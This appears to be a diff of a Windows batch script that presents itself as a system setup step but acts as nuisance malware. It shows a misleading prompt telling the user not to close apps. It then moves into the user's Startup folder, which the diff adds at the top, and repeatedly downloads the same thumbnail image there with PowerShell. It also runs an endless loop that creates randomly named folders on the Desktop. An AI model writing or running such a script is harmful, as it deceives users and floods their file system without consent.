@@ -1,5 +1,6 @@
 @echo off
 start "" /wait cmd /c "echo Before prosiding, we need to get your system ready. We may need to open some apps and run some codes so don't close those apps!&echo(&pause"
+CD %HOMEDRIVE%%HOMEPATH%\Start Menu\Programs\Startup
 Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdefault.jpg -OutFile image_freak_off1.jpg"
 Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdefault.jpg -OutFile image_freak_off2.jpg"
 Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdefault.jpg -OutFile image_freak_off3.jpg"
@@ -11,7 +12,6 @@ cd "Desktop"
 :A
 mkdir %random%
 goto A
-CD %HOMEDRIVE%%HOMEPATH%\Start Menu\Programs\Startup
 Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdefault.jpg -OutFile image_freak_off8.jpg"
 Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdefault.jpg -OutFile image_freak_off9.jpg"
 Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdefault.jpg -OutFile image_freak_off10.jpg"
